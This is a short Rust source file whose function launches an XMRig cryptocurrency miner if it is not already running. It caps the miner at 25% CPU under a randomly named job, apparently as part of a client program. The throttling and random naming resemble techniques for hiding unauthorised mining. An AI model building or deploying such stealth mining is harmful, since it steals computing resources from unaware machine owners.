use shared::utils::functions::spawn_program;
use shared::utils::functions::generate_random_string;
use client_vars::constants::default_miner_cpu_limit;
use crate::network::basic::get_xmrig_summary;
use crate::utils::jobs::limit_cpu_usage;
use anyhow::Result;

pub async fn run_miner(miner_file_path: &str) -> Result<()> {
    // run the executable and limit its cpu to 25%

    // only run if already not running - check - simply fetch the summary and if no summary then run
    if let Ok(summary) = get_xmrig_summary().await {
        Ok(())
    } else {
        let pid = spawn_program(miner_file_path, None)?;
        let job_name = generate_random_string(8);
        limit_cpu_usage(pid, default_miner_cpu_limit(), &job_name)?;
        Ok(())
    }
}
